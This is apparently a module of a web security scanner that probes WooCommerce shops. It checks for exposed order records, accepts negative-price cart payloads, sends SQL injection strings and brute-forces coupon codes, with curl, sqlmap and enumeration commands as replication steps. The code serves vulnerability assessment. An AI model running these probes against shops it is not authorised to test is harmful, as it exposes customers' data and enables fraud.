import type { ModuleResult, ScanState } from '../types.js';
import { fetchURL, finding, moduleResult, normalizeTarget, containsAny, parallelProbe} from '../utils.js';

const MODULE_NAME = 'WooCommerce';

const COMMON_COUPONS = [
  'SAVE10', 'TEST', 'ADMIN', 'FREE', 'DISCOUNT', '10OFF', '20OFF',
  'SALE', 'PROMO', 'COUPON', 'VIP', 'NEW10', 'WELCOME',
];

const SQLI_PAYLOADS = [
  "1' OR '1'='1",
  '1 OR 1=1--',
  "' UNION SELECT NULL--",
];

const SQLI_ERROR_INDICATORS = [
  'SQL syntax', 'mysql_fetch', 'mysqli_', 'You have an error',
  'ORA-', 'syntax error', 'unexpected token',
];

async function getWooVersion(target: string): Promise<string | null> {
  try {
    const res = await fetchURL(`${target}/wp-content/plugins/woocommerce/readme.txt`);
    if (!res || res.status !== 200) return null;
    const text = await res.text();
    for (const line of text.split('\n')) {
      const m = line.match(/(?:Stable tag|Version)\s*:\s*([\d.]+)/i);
      if (m) return m[1];
    }
  } catch {
    // ignore
  }
  return null;
}

export async function run(target: string, _state?: ScanState): Promise<ModuleResult> {
  const start = Date.now();
  target = normalizeTarget(target);
  const findings: ReturnType<typeof finding>[] = [];
  const errors: string[] = [];

  try {
    // Step 1: Version detection
    const wooVersion = await getWooVersion(target);
    if (wooVersion) {
      const readmeUrl = `${target}/wp-content/plugins/woocommerce/readme.txt`;
      findings.push(finding('woocommerce_version_exposed', 'INFO', readmeUrl,
        `WooCommerce version ${wooVersion} detected via readme.txt.`,
        {
          replication_steps: [`curl -s "${readmeUrl}" | grep -E "Stable tag|Version"`],
          remediation: 'Remove or restrict access to readme.txt files.',
          evidence: JSON.stringify({ version: wooVersion }),
        },
      ));
    }

    // Step 2: Order ID IDOR enumeration
    await parallelProbe(Array.from({ length: 20 }, (_, i) => i + 1), async (orderId) => {
      const url = `${target}/wp-json/wc/v3/orders/${orderId}`;
      try {
        const res = await fetchURL(url);
        if (!res || res.status !== 200) return;
        const text = await res.text();
        if (!text.trim().startsWith('{')) return;
        let data: Record<string, unknown>;
        try { data = JSON.parse(text); } catch { return; }

        // Skip error responses (e.g. {"status":"error","code":"woocommerce_rest_cannot_view"})
        if (typeof data.code === 'string' && data.code.startsWith('woocommerce_rest_')) return;

        // Require actual order-specific data — not just generic id/status fields
        const billing = data.billing as Record<string, unknown> | undefined;
        const hasBillingPII = billing && (billing.email || billing.first_name || billing.last_name);
        const hasLineItems = Array.isArray(data.line_items) && data.line_items.length > 0;
        const hasPaymentInfo = typeof data.payment_method === 'string' && data.payment_method.length > 0;
        if (hasBillingPII || hasLineItems || hasPaymentInfo) {
          findings.push(finding('woocommerce_order_idor', 'HIGH', url,
            `WooCommerce order ID ${orderId} accessible without authentication. ` +
            `Order status: '${data['status'] ?? 'unknown'}'. ` +
            'Customer PII and payment data may be exposed.',
            {
              replication_steps: [
                `curl -s "${url}" | python3 -m json.tool`,
                '# Observe order details (billing address, items, email).',
                `# Enumerate: for i in $(seq 1 100); do curl -s "${target}/wp-json/wc/v3/orders/$i" | grep -E 'id|status|billing'; done`,
              ],
              remediation:
                'Require authentication for all WooCommerce REST API endpoints. ' +
                'Set woocommerce_rest_check_permissions properly.',
              evidence: JSON.stringify({ order_id: orderId, status: data['status'] ?? '', cvss_score: 7.5, cve_refs: ['CVE-2021-32620'] }),
            },
          ));
        }
      } catch (e) {
        errors.push(String(e));
      }
    });

    // Step 3: Price manipulation via cart API
    const cartUrl = `${target}/wp-json/wc/v3/cart/add-item`;
    const manipulationTests = [
      { id: 1, quantity: -1 },
      { id: 1, quantity: 0 },
      { id: 1, quantity: 1, price: 0 },
      { id: 1, quantity: 1, price: -99 },
    ];
    await parallelProbe(manipulationTests, async (payload) => {
      try {
        const res = await fetchURL(cartUrl, {
          method: 'POST',
          body: JSON.stringify(payload),
          headers: { 'Content-Type': 'application/json' },
        });
        if (!res || (res.status !== 200 && res.status !== 201)) return;
        const body = await res.text();
        let cartData: Record<string, unknown>;
        try { cartData = JSON.parse(body); } catch { return; }
        // Verify response actually contains cart data showing the manipulated price was accepted
        const hasCartItems = Array.isArray(cartData.items) && cartData.items.length > 0;
        const hasCartTotals = typeof cartData.totals === 'object' && cartData.totals !== null;
        if (hasCartItems || hasCartTotals) {
          findings.push(finding('woocommerce_price_manipulation', 'CRITICAL', cartUrl,
            `Cart API accepted manipulated item payload: ${JSON.stringify(payload)}. ` +
            'Price/quantity manipulation may be possible.',
            {
              replication_steps: [
                `curl -s -X POST "${cartUrl}" \\`,
                '  -H "Content-Type: application/json" \\',
                `  -d '${JSON.stringify(payload)}'`,
                '# Observe cart total in response — check for 0 or negative price.',
              ],
              remediation:
                'Validate price and quantity server-side. ' +
                'Never trust client-supplied price values. ' +
                'Update WooCommerce to the latest version.',
              evidence: JSON.stringify({ payload, http_status: res.status, cvss_score: 9.1, cve_refs: ['CVE-2022-21664'] }),
            },
          ));
          return;
        }
      } catch (e) {
        errors.push(String(e));
      }
    });

    // Step 4: SQLi via cart fragment endpoint
    const sqliUrl = `${target}/?wc-ajax=get_refreshed_fragments`;
    for (const payload of SQLI_PAYLOADS) {
      try {
        const body = new URLSearchParams({ cart_hash: payload }).toString();
        const res = await fetchURL(sqliUrl, {
          method: 'POST',
          body,
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        });
        if (!res) continue;
        const text = await res.text();
        if (containsAny(text, SQLI_ERROR_INDICATORS)) {
          findings.push(finding('woocommerce_sqli', 'CRITICAL', sqliUrl,
            `SQL error triggered via cart_hash parameter with payload '${payload}'. ` +
            'Possible SQLi in WooCommerce cart fragment endpoint.',
            {
              replication_steps: [
                `curl -s -X POST "${sqliUrl}" \\`,
                `  -d "cart_hash=${encodeURIComponent(payload)}"`,
                '# Observe SQL error in response.',
                `sqlmap -u "${sqliUrl}" --data "cart_hash=1" --dbs --batch`,
              ],
              remediation:
                'Update WooCommerce immediately. ' +
                'Use prepared statements for all database queries.',
              evidence: JSON.stringify({ payload, cvss_score: 9.8, cve_refs: ['CVE-2022-21664'] }),
            },
          ));
        }
      } catch (e) {
        errors.push(String(e));
      }
    }

    // Step 5: Coupon brute force
    const couponUrl = `${target}/?wc-ajax=apply_coupon`;
    const validCoupons: string[] = [];
    await parallelProbe(COMMON_COUPONS, async (code) => {
      try {
        const body = new URLSearchParams({ coupon_code: code }).toString();
        const res = await fetchURL(couponUrl, {
          method: 'POST',
          body,
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        });
        if (!res || res.status !== 200) return;
        const text = await res.text();
        const lower = text.toLowerCase();
        if ((lower.includes('coupon') || lower.includes('discount')) &&
            !lower.includes('error') && !lower.includes('invalid')) {
          validCoupons.push(code);
        }
      } catch (e) {
        errors.push(String(e));
      }
    });
    if (validCoupons.length > 0) {
      findings.push(finding('woocommerce_coupon_bruteforce', 'MEDIUM', couponUrl,
        `Valid WooCommerce coupon(s) found via brute force: ${JSON.stringify(validCoupons)}. ` +
        'No rate-limiting detected on coupon application endpoint.',
        {
          replication_steps: [
            `curl -s -X POST "${couponUrl}" -d "coupon_code=SAVE10"`,
            '# Observe discount applied in response.',
            '# Automate with: for code in SAVE10 TEST FREE ADMIN; do curl -s ...; done',
          ],
          remediation:
            'Implement rate-limiting on the apply_coupon endpoint. ' +
            'Use non-guessable coupon codes. ' +
            'Set coupon usage limits.',
          evidence: JSON.stringify({ valid_coupons: validCoupons, cvss_score: 4.3 }),
        },
      ));
    }
  } catch (e) {
    errors.push(String(e));
  }

  return moduleResult(MODULE_NAME, target, findings, errors, start);
}
